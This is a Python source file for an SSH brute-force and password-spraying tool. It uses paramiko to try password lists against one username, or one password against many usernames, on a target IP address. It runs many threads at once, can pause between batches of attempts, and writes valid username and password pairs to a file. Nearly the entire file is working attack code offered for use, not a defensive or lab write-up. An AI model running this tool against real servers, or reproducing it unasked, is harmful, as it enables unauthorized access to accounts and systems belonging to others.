#!/usr/bin/env python3 -tt
#-*- coding: utf-8 -*-

"""
NAME: password_finder.py
VERSION: 0.1
AUTHOR: Jesse Leverett (CyberThulhu)
STATUS: Building Initial code framework
DESCRIPTION: Allows for a User to bruteforce/password spray SSH credentials
TO-DO:
    [ ] Impliment Single User, Single Password Mode
    [ ] Impliment Multi User, Multi Password
    [ ] Add Ouptut Option Functionality
COPYRIGHT Â© 2021 Jesse Leverett
"""

# Imports
import sys
import time
import socket
import argparse
import ipaddress
from threading import Thread
from datetime import datetime
try:
    from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
except ImportError:
    print("[-] ERROR: 'paramiko' is a required package to run this program.")
    sys.exit(1)

# Added Variables
__author__      = "Jesse Leverett"
__copyright__   = "Copyright (C) 2021 Jesse Leverett"
__license__     = "MIT License"
__version__     = "0.1"

# Instantiate Argparser
PROG_DESCRIPTION    = "Allows for a User to bruteforce/password spray SSH credentials"
PROG_EPILOG         = f"{__copyright__}"
VERSION_HELP_TEXT   = "Prints Version Information"
parser = argparse.ArgumentParser(prog="password_finder",
                                description = PROG_DESCRIPTION,
                                epilog = PROG_EPILOG,
                                formatter_class= argparse.RawDescriptionHelpFormatter)

parser.add_argument('--version', action="version",
                    version=f"PROG: %(prog)s \t VERSION: {__version__}", help=VERSION_HELP_TEXT)

# Instantiate SubParsers
sub_parser = parser.add_subparsers(description="Select the Mode to Use", dest="passw_finder_mode")

# Add SubParsers
brute_force_parser = sub_parser.add_parser("bf", help="Brute Forcing Mode")
passw_spray_parser = sub_parser.add_parser("ps", help="Password Spraying Mode")

# Shared Arguments
def add_parse_arguments(input_sub_parser=None) -> argparse.Namespace:
    """ Shared Arguments for Sub-Parsers """
    # Help Texts for Arguments
    ipaddr_help_text    = "Sets IP Address"
    port_help_text      = "If used; Sets Port [Default: 22]"
    timeout_help_text   = "If used; Sets SSH Connection timeout (secs) [Default=1]"
    qos_help_text       = "If used; Exits program on successful credentials"
    output_help_text    = "If used; Outputs results to file"
    verbose_help_text   = "If used; Sets Verbosity [Default: False]"

    # Add Shared Arguments
    input_sub_parser.add_argument('-i', dest="ip_address", metavar='X.X.X.X',
                                type=str, default=None, required=True, help=ipaddr_help_text)
    input_sub_parser.add_argument('-p', dest="protocol_port", metavar='#',
                                type=int, default=22, required=False, help=port_help_text)
    input_sub_parser.add_argument('-t', dest="set_timeout", metavar='#',
                                type=int, default=1, required=False, help=timeout_help_text)
    input_sub_parser.add_argument('-q', dest="quit_on_success", default=False,
                                required=False, action="store_true", help=qos_help_text)
    input_sub_parser.add_argument('-o', dest="output_file", metavar=r'outfile.txt',
                                type=str, default=None, required=False, help=output_help_text)
    input_sub_parser.add_argument('-v', dest="verbose", default=False,
                                required=False, action="store_true", help=verbose_help_text)

# Brute Forcing Arguments
USERN_HELP_TEXT = "Sets Username to Brute Force"
PASSL_HELP_TEXT = "Sets List of Passwords to Attempt"
LIMIT_HELP_TEXT = "If used; Sets Limit of Password attempts"
WTIME_HELP_TEXT = "If used; Sets Wait time Between Attempts"

brute_force_parser.add_argument('-u', '--username', dest="bf_username", metavar='',
                                type=str, default=None, required=True, help=USERN_HELP_TEXT)
brute_force_parser.add_argument('-c', '--passlist', dest="bf_passlist", metavar='',
                                type=str, default=None, required=True, help=PASSL_HELP_TEXT)
brute_force_parser.add_argument('-l', dest="num_of_passw_attempts", metavar='#',
                                type=int, default=None, required=False, help=LIMIT_HELP_TEXT)
brute_force_parser.add_argument('-w', dest="wait_time_per_attempts", metavar='#',
                                type=int, default=None, required=False, help=WTIME_HELP_TEXT)
add_parse_arguments(brute_force_parser)

# Password Spraying Arguments
USERL_HELP_TEXT = "Sets List of Users to Password Spray"
PASSW_HELP_TEXT = "Sets Password to Attempt"
passw_spray_parser.add_argument('-u', '--userlist', dest="ps_userlist", metavar='',
                                type=str, default=None, required=True, help=USERL_HELP_TEXT)
passw_spray_parser.add_argument('-c', '--password', dest="ps_password", metavar='',
                                type=str, default=None, required=True, help=PASSW_HELP_TEXT)
add_parse_arguments(passw_spray_parser)

# Parse Arguments
pargs = parser.parse_args()

# Initial Functions
def verbosity_checker(verbose_text:str) -> str:
    """ Checks if the Verbose Argument is True then Returns Parameter"""
    if pargs.verbose is True:
        print(verbose_text)

def read_file(file:str) -> list:
    """Reads a File"""
    # Open and Read a File
    outfile = []
    with open(fr'{file}', 'r', encoding="utf-8") as infile:
        for line in infile.readlines():
            outfile.append(line.rstrip())
    return outfile

def output_results(result_to_outfile:str, outfile:str=pargs.output_file) -> str:
    """Outputs results to a file or to the screen"""
    if outfile is not None:
        with open(str(outfile), "a", encoding="utf-8") as output_file:
            output_file.write(result_to_outfile)
        return f"[!] INFO: Results written to {output_file}"
    return result_to_outfile

# Class SSH Connection
class SSHConnect:
    """ Class for SSH Connection """
    def __init__(self, username:str=None, password:str=None, ip_address:str=pargs.ip_address,
                protocol_port:int=pargs.protocol_port) -> None:
        self.username       = username
        self.password       = password
        self.ip_address     = ip_address
        self.protocol_port  = protocol_port
        self.ssh_client     = SSHClient()
        self.ssh_client.set_missing_host_key_policy(AutoAddPolicy())

    def test_ip_struct(self) -> bool:
        """Checks if string is an IP Address"""
        try:
            verbosity_checker(f"[!] TASK: Checking if {self.ip_address} is VALID...")
            ipaddress.ip_address(self.ip_address)
            verbosity_checker(f"[+] INFO: {self.ip_address} is VALID!")
            return True
        except ValueError:
            print(f"[-] ERROR: Address/Netmask is invalid...Skipping: {self.ip_address}")
            return False

    def test_connection(self) -> bool:
        """ Testing Connection to Destination """
        try:
            verbosity_checker(f"[!] TASK: Checking if {self.ip_address} is ALIVE...")
            socket.gethostbyaddr(self.ip_address)
            verbosity_checker(f"[!] INFO: {self.ip_address} is ALIVE!")
            return True
        except (socket.error, socket.herror, socket.gaierror, socket.timeout, OSError):
            print(f"[-] ERROR: Could not connect to {self.ip_address}.")
            return False

    def test_protocol(self) -> bool:
        """ Testing if SSH/Port 22 is Open """
        try:
            verbosity_checker(f"[!] TASK: Checking if PORT ->{self.protocol_port} is OPEN...")
            start_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            start_socket.settimeout(pargs.set_timeout)
            start_socket.connect((self.ip_address, self.protocol_port))
            verbosity_checker(f"[!] INFO: {self.protocol_port} is OPEN!")
            start_socket.shutdown(socket.SHUT_RDWR)
            start_socket.close()
            return True
        except (socket.error, socket.herror, socket.gaierror, socket.timeout, OSError):
            print(f"[-] ERROR: Could not connect to PORT:{self.protocol_port}")
            sys.exit(1)

    def ssh_connection(self) -> None:
        """ Creating Connection to IP/Port """
        try:
            self.ssh_client.connect(self.ip_address,self.protocol_port,self.username,self.password)
            self.ssh_client.close()
            print(f"[+] INFO: Correct USER/PASS Combo: {self.username} : {self.password}")
            if pargs.output_file is not None:
                ssh_output_result = f"{'USERNAME: '}{self.username:<13}{'PASSWORD: '}{self.password}\n"
                output_results(ssh_output_result)
        except AuthenticationException:
            verbosity_checker(f"[-] INFO: Incorrect USER/PASS: {self.username} : {self.password}")

def run(run_username:str, run_password:str) -> None:
    """ Main Running """
    verbosity_checker(f"[+] TASK: Checking USER/PASS -> {run_username}:{run_password}")
    SSHConnect(run_username, run_password).ssh_connection()

def main() -> None:
    """ Main Code """
    init_obj = SSHConnect()

    # Test if everything is VALID or REACHABLE
    if init_obj.test_ip_struct() and init_obj.test_connection() and init_obj.test_protocol:

        # If Results will written, Create Header
        if pargs.output_file is not None:
            ip_header_result = f"IP_ADDRESS: {init_obj.ip_address}"
            port_header_result = f"PORT: {init_obj.protocol_port}"
            ssh_output_header = f"{ip_header_result:<32}{port_header_result}\n"
            output_results(ssh_output_header)

        # If mode selected is Brute Force Mode
        if pargs.passw_finder_mode == "bf":
            bf_password_list = read_file(pargs.bf_passlist)
            bf_pssw_list_len = len(bf_password_list)
            bf_threads = []
            if pargs.num_of_passw_attempts is not None and pargs.wait_time_per_attempts is not None:
                for index in range(0, bf_pssw_list_len):
                    if index % pargs.num_of_passw_attempts == 0 and index != 0:
                        time.sleep(pargs.wait_time_per_attempts)
                    password = bf_password_list[index]
                    bf_t = Thread(target=run, args = [pargs.bf_username, password], daemon=True)
                    bf_t.start()
                    bf_threads.append(bf_t)
            else:
                bf_thread = []
                for password in bf_password_list:
                    bf_t = Thread(target=run, args=[pargs.bf_username, password], daemon=True)
                    bf_t.start()
                    bf_threads.append(bf_t)
                for bf_thread in bf_threads:
                    bf_thread.join()

        # If mode selected is Password Spray Mode
        elif pargs.passw_finder_mode == "ps":
            ps_username_list = read_file(pargs.ps_userlist)
            ps_threads = []
            for username in ps_username_list:
                ps_t = Thread(target=run, args=[username, pargs.ps_password], daemon=True)
                ps_t.start()
                ps_threads.append(ps_t)
            for ps_thread in ps_threads:
                ps_thread.join()

if __name__ == "__main__":
    try:
        start_time = datetime.now()
        main()
        close_time = datetime.now()
        total_time = close_time - start_time
        verbosity_checker(f"[!] INFO: Total Execution Time {total_time}")
        sys.exit(0)
    except (KeyboardInterrupt, OSError):
        sys.exit(1)
else:
    sys.exit(1)
